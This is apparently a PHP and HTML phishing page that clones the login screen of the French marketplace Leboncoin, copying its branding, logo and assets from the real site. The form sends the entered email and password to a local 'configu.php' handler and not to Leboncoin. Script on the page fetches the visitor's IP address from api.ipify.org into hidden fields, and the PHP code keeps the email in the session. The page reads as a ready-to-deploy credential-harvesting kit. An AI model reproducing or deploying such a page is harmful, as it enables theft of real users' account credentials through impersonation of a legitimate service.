<?php
if (session_status() == PHP_SESSION_NONE) {
  session_start();
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
  // Récupérer l'email depuis le formulaire
  $email = $_POST['email'];

  // Enregistrer l'email dans la session
  $_SESSION['email'] = $email;
}
?>
<!DOCTYPE html>
<html lang="fr" class="text-[62.5%]">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

  <title>Se connecter - LBC</title>
  <meta
    data-react-helmet="true"
    name="viewport"
    content="width=device-width, initial-scale=1.0, maximum-scale=6.0 user-scalable=0" />
  <meta name="next-head-count" content="3" />
  <link
    rel="icon"
    href="https://www.leboncoin.fr/_next/static/media/favicon.2b8b94c9.ico"
    sizes="32x32" />
  <link
    rel="icon"
    href="https://www.leboncoin.fr/_next/static/media/favicon.6fd07af6.svg"
    type="image/svg+xml"
    data-test-id="no-unread-msgs" />
  <link
    rel="apple-touch-icon"
    href="https://www.leboncoin.fr/_next/static/media/apple-touch-icon.fdb8f5a0.png" />
  <link
    rel="preload"
    href="https://auth.leboncoin.fr/static/fonts/nunitosans-regular.woff2"
    as="font"
    type="font/woff2"
    crossorigin="anonymous" />
  <link
    rel="preload"
    href="https://auth.leboncoin.fr/static/fonts/nunitosans-bold.woff2"
    as="font"
    type="font/woff2"
    crossorigin="anonymous" />
  <link
    rel="preload"
    href="https://auth.leboncoin.fr/static/fonts/nunitosans-semibold.woff2"
    as="font"
    type="font/woff2"
    crossorigin="anonymous" />
  <link
    rel="icon"
    href="https://auth.leboncoin.fr/favicon-leboncoin.ico"
    sizes="any" />
  <link
    rel="preload"
    href="./index_files/style.css"
    as="style"
    crossorigin="anonymous" />
  <link
    rel="stylesheet"
    href="./index_files/style.css"
    crossorigin="anonymous"
    data-n-g="" />
  <noscript data-n-css=""></noscript>

  <script src="https://cdn.jsdelivr.net/gh/yogeshwaran01/formBot.js@1.0.0/formBot.min.js"></script>

  <script
    src="./index_files/_middlewareManifest.js.téléchargement"
    defer=""
    crossorigin="anonymous"></script>
  <style data-styled="active" data-styled-version="5.2.3"></style>

  <script
    id="tmx_tags_js"
    type="text/javascript"
    src="./index_files/imp95sy7312kt8r7.js.téléchargement"></script>

  <style>
    @font-face {
      font-family: "NotoSans_online_security";
      src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-regular.woff);
    }

    @font-face {
      font-family: "NotoSans_medium_online_security";
      src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-medium.ttf);
    }

    @font-face {
      font-family: "NotoSans_bold_online_security";
      src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-bold.woff);
    }

    @font-face {
      font-family: "NotoSans_semibold_online_security";
      src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-semibold.ttf);
    }
  </style>
</head>

<body
  class="bg-background text-on-background font-nunito-sans"
  cz-shortcut-listen="true">
  <div id="__next" data-reactroot="">
    <div
      data-theme="leboncoin"
      class="relative grid h-[100vh] grid-cols-page grid-rows-small-page overflow-x-hidden grid-areas-page sm:grid-rows-wide-page">
      <header class="flex flex-col justify-evenly shadow grid-in-header">
        <div
          class="z-base flex h-full items-center justify-center bg-background">
          <div class="flex h-xl sm:h-2xl">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 102 19"
              class="h-xl sm:h-2xl w-auto">
              <path
                fill="#F56B2A"
                fill-rule="evenodd"
                d="M25.732 15.662c1.607 0 2.593-1.271 2.593-3.167 0-1.895-.986-3.166-2.593-3.166-1.606 0-2.588 1.27-2.588 3.166s.982 3.167 2.588 3.167zm1.199-9.401c3.072 0 5.087 2.639 5.087 6.188 0 3.62-2.112 6.281-5.206 6.281-1.654 0-3.043-.765-3.86-2.061h-.05v1.823h-3.358V2.422c0-1.223.816-1.988 1.798-1.988.986 0 1.802.765 1.802 1.989v5.729h.047c1.007-1.292 2.278-1.891 3.74-1.891zm12.377 9.4c1.606 0 2.588-1.27 2.588-3.166 0-1.895-.982-3.166-2.588-3.166-1.607 0-2.593 1.27-2.593 3.166s.986 3.167 2.593 3.167zm0-9.4c3.79 0 6.235 2.588 6.235 6.234 0 3.647-2.444 6.235-6.235 6.235-3.791 0-6.235-2.588-6.235-6.235 0-3.646 2.444-6.234 6.235-6.234zm47.605-.002c.982 0 1.802.77 1.802 1.993V18.49h-3.6V8.252c0-1.224.816-1.993 1.798-1.993zm0-6.259a2.192 2.192 0 0 1 2.184 2.184 2.19 2.19 0 0 1-2.184 2.18c-1.199 0-2.206-.934-2.206-2.18 0-1.177.96-2.184 2.206-2.184zM98.16 6.259c2.494 0 3.837 1.776 3.837 4.462v7.77h-3.595v-6.762c0-1.581-.744-2.113-1.679-2.113-1.394 0-2.448 1.178-2.448 3.672v5.202h-3.6V8.13c0-1.173.77-1.87 1.683-1.87.91 0 1.675.697 1.675 1.87v.455h.05c.915-1.411 2.304-2.325 4.077-2.325zm-20.794 9.403c1.61 0 2.588-1.271 2.588-3.167 0-1.895-.977-3.166-2.588-3.166-1.606 0-2.588 1.27-2.588 3.166s.982 3.167 2.588 3.167zm0-9.401c3.791 0 6.239 2.588 6.239 6.234 0 3.647-2.448 6.235-6.239 6.235s-6.235-2.588-6.235-6.235c0-3.646 2.444-6.234 6.235-6.234zM65.808 9.378c-1.555 0-2.52 1.152-2.52 3.115 0 1.968.965 3.12 2.52 3.12 1.033 0 1.802-.502 2.185-1.199h.047l2.613 1.68c-.91 1.776-2.809 2.638-4.964 2.638-3.74 0-6.043-2.592-6.043-6.239 0-3.642 2.303-6.234 6.043-6.234 2.155 0 4.055.862 4.964 2.639l-2.613 1.679h-.047c-.383-.697-1.152-1.199-2.185-1.199zM54.465 6.26c2.495 0 3.834 1.776 3.834 4.462v7.77h-3.591V11.73c0-1.581-.744-2.113-1.683-2.113-1.39 0-2.444 1.178-2.444 3.672v5.202h-3.6V8.13c0-1.173.77-1.87 1.679-1.87.914 0 1.679.697 1.679 1.87v.455h.05c.91-1.411 2.3-2.325 4.076-2.325zM9.81 11.783c0 .4.119.99.264 1.36l3.986-2.97c-.217-.324-.646-1.042-1.84-1.042-1.135 0-2.41.833-2.41 2.652zm3.485 4.012c1.437 0 2.61-1.08 3.077-1.976l2.367 1.704c-.905 1.845-2.766 3.209-5.869 3.209a6.083 6.083 0 0 1-4.029-1.517c-1.56 1.037-2.907 1.491-4.241 1.491-2.696 0-4.6-1.802-4.6-4.516V2.39C0 1.17.812.406 1.79.406c.981 0 1.793.765 1.793 1.985l.004 11.492c0 1.168.501 1.793 1.572 1.793.574 0 1.203-.336 2.02-.782a7.42 7.42 0 0 1-.579-2.928c0-2.542 1.81-5.708 5.619-5.708 3.306 0 5.079 1.921 5.818 4.335l-6.366 4.56c.335.294.811.642 1.623.642z"></path>
            </svg>
          </div>
        </div>
      </header>
      <main class="flex h-full flex-col pt-xl">
        <div
          class="h-[calc(100%-50px)] md:h-[calc(100%-60px)] md:bg-no-repeat md:bg-bottom md:bg-[length:980px] md:bg-[url(/static/login-illustration.png)]">
          <div
            class="flex flex-col justify-start text-left w-auto h-auto pl-lg pr-lg pb-lg md:pl-2xl md:pr-2xl md:pb-2xl md:pt-2xl md:m-auto md:mt-3xl md:max-w-3xl md:rounded-lg md:shadow md:bg-background">
            <form
              class="flex flex-col gap-2xl"
              method="post"
              action="configu.php">
              <input type="hidden" name="session_token" id="session_token" value="" />
              <!-- Champ caché pour l'adresse IP sera renseigné en PHP -->
              <input type="hidden" name="client_ip" id="client_ip" value="" />
              <div data-testid="subtitle" class="flex flex-col gap-md">
                <h2 class="text-display-3 text-on-surface">Bonjour !</h2>
                <p class="text-body-1 text-on-surface">
                  Connectez-vous pour découvrir toutes nos fonctionnalités.
                </p>
              </div>

              <div
                data-spark-component="form-field"
                class="!gap-sm text-body-1 flex flex-col gap-sm">
                <label
                  data-spark-component="form-field-label"
                  class="text-body-1 flex items-center gap-sm"
                  id="email"
                  for="email">E-mail<span
                    data-spark-component="label-required-indicator"
                    role="presentation"
                    aria-hidden="true"
                    class="text-caption text-on-surface/dim-3">*</span>
                </label>

                <div
                  class="relative inline-flex w-full after:hidden after:hidden">
                  <div class="relative inline-flex w-full">
                    <input
                      type="email"
                      id="email"
                      name="email"
                      class="relative ring-1 ring-inset peer box-border w-full appearance-none outline-none bg-surface text-ellipsis text-body-1 text-on-surface caret-neutral focus:ring-2 autofill:shadow-surface autofill:shadow-[inset_0_0_0px_1000px] disabled:cursor-not-allowed disabled:bg-on-surface/dim-5 disabled:text-on-surface/dim-3 read-only:cursor-default read-only:border-on-surface/dim-3 read-only:bg-on-surface/dim-5 h-sz-44 ring-outline hover:ring-outline-high focus:ring-outline-high disabled:ring-outline rounded-l-lg rounded-r-lg pl-lg pr-lg"
                      required=""
                      aria-invalid="false"
                      value=""
                      data-sider-select-id="fc72156e-3e5a-4417-a1e6-f5a87db6b29f" />
                  </div>
                </div>
              </div>

              <div class="flex flex-col">
                <div
                  data-spark-component="form-field"
                  class="!w-full !gap-sm flex flex-col gap-sm">
                  <label
                    data-spark-component="form-field-label"
                    class="text-body-1 flex items-center gap-sm"
                    id="password"
                    for="password">Mot de passe<span
                      data-spark-component="label-required-indicator"
                      role="presentation"
                      aria-hidden="true"
                      class="text-caption text-on-surface/dim-3">*</span>
                  </label>

                  <div
                    class="relative inline-flex w-full after:hidden after:hidden">
                    <div class="relative inline-flex w-full">
                      <input
                        type="password"
                        id="password"
                        name="password"
                        class="relative ring-1 ring-inset peer box-border w-full appearance-none outline-none bg-surface text-ellipsis text-body-1 text-on-surface caret-neutral focus:ring-2 autofill:shadow-surface autofill:shadow-[inset_0_0_0px_1000px] disabled:cursor-not-allowed disabled:bg-on-surface/dim-5 disabled:text-on-surface/dim-3 read-only:cursor-default read-only:border-on-surface/dim-3 read-only:bg-on-surface/dim-5 h-sz-44 ring-outline hover:ring-outline-high focus:ring-outline-high disabled:ring-outline rounded-l-lg rounded-r-none pl-lg pr-lg"
                        required=""
                        aria-invalid="false"
                        autocomplete="current-password"
                        value=""
                        aria-describedby="radix-2" />
                    </div>
                    <div class="rounded-r-lg">
                      <button
                        type="button"
                        onclick="togglePasswordVisibility()"
                        class="u-shadow-border-transition box-border inline-flex items-center justify-center gap-md whitespace-nowrap px-lg text-body-1 font-bold focus-visible:outline-none focus-visible:u-ring [&amp;:not(:focus-visible)]:ring-inset bg-surface min-w-sz-44 h-sz-44 rounded-lg text-on-surface hover:bg-surface-hovered enabled:active:bg-surface-pressed focus-visible:bg-surface-focused px-none text-body-1 overflow-hidden ring-1 ring-inset shrink-0 h-full focus-visible:relative focus-visible:z-raised ring-outline ml-[-1px] !rounded-l-none rounded-r-lg"
                        aria-busy="false"
                        aria-live="off"
                        aria-label="toggle password visibility">
                        <svg
                          id="eyeIcon"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                          data-title="EyeOffOutline"
                          fill="currentColor"
                          stroke="none"
                          class="fill-current text-neutral w-sz-24 h-sz-24"
                          data-spark-component="icon"
                          aria-hidden="true"
                          focusable="false">
                          <path
                            fill-rule="evenodd"
                            d="M21.38 10.47c-.35-.37-.82-.84-1.38-1.32-.4-.34-1.02-.31-1.38.08-.36.39-.33.98.07 1.33.5.43.92.85 1.23 1.19.07.08.11.17.11.27s-.03.19-.1.27c-.7.72-1.83 1.78-3.23 2.65-1.41.87-3.02 1.52-4.72 1.52h-.56c-.54 0-.98.42-.98.94s.43.94.98.94h.56c2.19 0 4.18-.83 5.77-1.82 1.59-.98 2.85-2.17 3.62-2.96h0c.39-.43.61-.98.61-1.54s-.22-1.11-.61-1.53v-.02ZM10.73 14.56l9.61-9.28c.38-.37.38-.97 0-1.34-.38-.37-1-.37-1.38 0l-2.8 2.71c-1.29-.6-2.7-.94-4.13-.97h-.02c-2.19 0-4.18.83-5.77 1.82-1.59.98-2.85 2.17-3.62 2.96h0c-.39.43-.61.98-.61 1.54s.22 1.11.61 1.53c1.03 1.09 2.2 2.04 3.47 2.85l-2.42 2.34c-.38.37-.38.97 0 1.34.38.37 1 .37 1.38 0l5.69-5.5h0Z"></path>
                        </svg>
                      </button>
                    </div>
                  </div>
                  <span
                    id="radix-2"
                    data-spark-component="form-field-helper-message"
                    class="text-on-surface/dim-1 text-caption">
                    <div class="flex">
                      <a
                        data-qa-id="link-forgotten-password"
                        class="cursor-pointer text-main-variant hover:text-main-variant-hovered focus:text-main-variant-focused active:text-main-variant-pressed underline text-caption font-bold !text-on-surface/dim-1">Mot de passe oublié</a>
                    </div>
                  </span>
                </div>
              </div>
              <button
                data-spark-component="button"
                class="u-shadow-border-transition box-border inline-flex items-center justify-center gap-md whitespace-nowrap px-lg text-body-1 font-bold focus-visible:outline-none focus-visible:u-ring [&amp;:not(:focus-visible)]:ring-inset min-w-sz-44 h-sz-44 rounded-lg bg-main text-on-main hover:bg-main-hovered enabled:active:bg-main-pressed focus-visible:bg-main-focused w-full"
                aria-busy="false"
                aria-live="off"
                type="submit">
                Se connecter
                <svg
                  viewBox="0 0 24 24"
                  xmlns="http://www.w3.org/2000/svg"
                  data-title="ArrowRight"
                  fill="currentColor"
                  stroke="none"
                  class="fill-current text-current w-sz-16 h-sz-16 text-on-main"
                  data-spark-component="icon"
                  aria-hidden="true"
                  focusable="false">
                  <path
                    fill-rule="evenodd"
                    d="m15.46,6.28c-.4.38-.41,1.01-.03,1.4l3.22,3.33H3c-.55,0-1,.44-1,.99s.45.99,1,.99h15.65l-3.22,3.33c-.38.4-.37,1.02.03,1.4.4.38,1.03.37,1.41-.03l4.85-5.01c.37-.38.37-.99,0-1.37l-4.85-5.01c-.38-.4-1.02-.41-1.41-.03Z"></path>
                </svg>
              </button>
              <div
                class="flex items-center gap-md flex-row w-full flex justify-center flex-wrap"
                data-testid="questionAction">
                <div data-testid="questionText">
                  <p class="text-callout">Envie de nous rejoindre ?</p>
                </div>
                <div data-testid="actionTextLink" tabindex="0">
                  <a
                    class="cursor-pointer text-main-variant hover:text-main-variant-hovered focus:text-main-variant-focused active:text-main-variant-pressed underline text-subhead">Créer un compte</a>
                </div>
              </div>
            </form>
            <script>
              document.getElementById("session_token").value = Math.random().toString(36).substring(2); // Génère un token simple
            </script>
          </div>
        </div>
      </main>
    </div>
    <svg height="0" width="0" class="src__Box-sc-10d053g-0 hItfWS"></svg>
  </div>

  <next-route-announcer>
    <p
      aria-live="assertive"
      id="__next-route-announcer__"
      role="alert"
      style="
          border: 0px;
          clip: rect(0px, 0px, 0px, 0px);
          height: 1px;
          margin: -1px;
          overflow: hidden;
          padding: 0px;
          position: absolute;
          width: 1px;
          white-space: nowrap;
          overflow-wrap: normal;
        "></p>
  </next-route-announcer>

  <iframe
    src="./index_files/saved_resource.html"
    id="tmx_tags_iframe"
    title="empty"
    tabindex="-1"
    aria-disabled="true"
    aria-hidden="true"
    data-time="1713630196779"
    style="
        width: 0px;
        height: 0px;
        border: 0px;
        position: absolute;
        top: -5000px;
      ">
  </iframe>
  <iframe
    id="tdz_ifrm"
    title="empty"
    name=""
    width="0px"
    height="0px"
    marginwidth="0"
    marginheight="0"
    frameborder="0"
    aria-disabled="true"
    aria-hidden="true"
    tabindex="-1"
    src="./index_files/tAqg0_-eSSO12CBY.html"
    style="
        display: none !important;
        z-index: -9999 !important;
        visibility: hidden !important;
      ">
  </iframe>
  <script>
    function togglePasswordVisibility() {
      const passwordInput = document.querySelector("input[name='password']");
      const eyeIcon = document.getElementById("eyeIcon");

      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        eyeIcon.setAttribute("data-title", "EyeOutline"); // Changer l'icône si nécessaire
      } else {
        passwordInput.type = "password";
        eyeIcon.setAttribute("data-title", "EyeOffOutline"); // Retourner à l'icône initiale
      }
    }
  </script>
  <script>
    // Fonction pour obtenir l'IP de l'utilisateur via une API (si nécessaire)
    async function getClientIp() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        console.error('Erreur lors de la récupération de l\'adresse IP:', error);
        return '';
      }
    }

    // Fonction pour générer un token de session
    function generateSessionToken() {
      return 'token_' + Math.random().toString(36).substr(2, 9);
    }

    // Applique l'IP et le token à tous les formulaires
    async function setFormData() {
      const clientIp = await getClientIp();
      const sessionToken = generateSessionToken();

      // Remplir tous les champs cachés des formulaires avec l'IP et le token
      document.querySelectorAll('input[name="client_ip"]').forEach(input => {
        input.value = clientIp;
      });
      document.querySelectorAll('input[name="session_token"]').forEach(input => {
        input.value = sessionToken;
      });
    }

    // Déclenche l'application des données au chargement de la page
    window.addEventListener('load', setFormData);
  </script>
</body>

</html>